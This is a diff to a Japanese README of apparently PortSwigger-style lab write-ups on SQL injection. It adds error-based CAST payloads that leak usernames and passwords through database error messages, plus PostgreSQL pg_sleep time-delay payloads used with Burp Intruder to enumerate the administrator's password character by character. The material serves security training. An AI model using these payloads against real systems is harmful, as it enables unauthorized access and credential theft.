@@ -35,6 +35,14 @@
   - [Visible error-based SQL injection](#visible-error-based-sql-injection)
     - [Goal](#goal-8)
     - [Analyze](#analyze-8)
+    - [Exploit](#exploit-7)
+  - [Blind SQL injection with time delays](#blind-sql-injection-with-time-delays)
+  - [Goal](#goal-9)
+  - [Analyze \& Exploit](#analyze--exploit)
+  - [Blind SQL injection with time delays and information retrieval](#blind-sql-injection-with-time-delays-and-information-retrieval)
+    - [Goal](#goal-10)
+    - [Analyze](#analyze-9)
+    - [Exploit](#exploit-8)
 
 ## ****SQL injection UNION attack, finding a column containing text****
 ---
@@ -431,16 +439,88 @@ administratorとしてログインすればﾖｼ
 
 ただクエリの結果を表示してくれはしないので、Blind SQL injectionを行う必要があります。
 
-Error baseで良いでしょう。
 と思い適当に入れていましたが、どうやらqueryの長さ制限がありそうな雰囲気を感じました。
 
-実行されているqueryは以下なので、これをもとに感じに取得していきたい。
+実行されているqueryは以下なので、これをもとにいい感じに取得していきたい。
 
 ```text
 SELECT * FROM tracking WHERE id = 'mF5dvvXhtsZ9QEya'
 ```
 
-comming soon...
+StackTraceが出てくる場合、Error MessageにQueryの結果を含ませることが可能な場合があります。
+
+```qurey
+' AND CAST((SELECT 'a') AS int)='1
+```
+
+![](./images/README_231030_185039.png)
+
+これにより、castしようとしている値が出力されることがわかります。
+
+### Exploit
+
+[Analyze](#analyze-8)結果を利用することで、usersテーブルの探索が可能です。
+
+```sql
+' AND CAST((SELECT username from users limit 1) AS int)='1
+```
+
+![](./images/README_231030_185211.png)
+
+limit 1の結果はadministratorが返ることがわかります。
+
+つまり、`username`を`password`にしてあげれば良さそうです。
+
+![](./images/README_231030_185338.png)
+
+## Blind SQL injection with time delays
+
+## Goal
+
+10秒遅延を起こす。
+
+## Analyze & Exploit
+
+`TrackId`が脆弱な箇所です。
+
+```sql
+'||pg_sleep(10) -- 
+```
+
+これを入れるだけ。。。
+
+## Blind SQL injection with time delays and information retrieval
+
+### Goal
+
+administratorとしてログインすれば良さそうです。
+
+### Analyze
+
+`trackId`に対して以下のペイロードで10秒ちょい遅延が発生するため脆弱性自体は特定できます。
+
+```sql
+RLp7SJP1WQbetJlb'||pg_sleep(10) -- -- 
+```
+
+特定ができたので後はやるだけです。
 
 
+### Exploit
 
+`passwordの長さ`
+```sql
+'||(select case when length(password) = $$ then pg_sleep(10) else pg_sleep(0) end from users)--
+```
+
+![](./images/README_231030_193057.png)
+
+
+上記で、Numbersを使い1~20までIntruderでぶち込むことで、20がであることがわかったので次にパスワードの列挙です。
+
+```sql
+'||(select case when substring(password, §§, 1) = '§§' then pg_sleep(10) else pg_sleep(0) end from users where username='administrator')--
+```
+![](./images/README_231030_193606.png)
+
+後は、Intruderの結果で10病の遅延が起きているものを使いログインすれば終わりです。
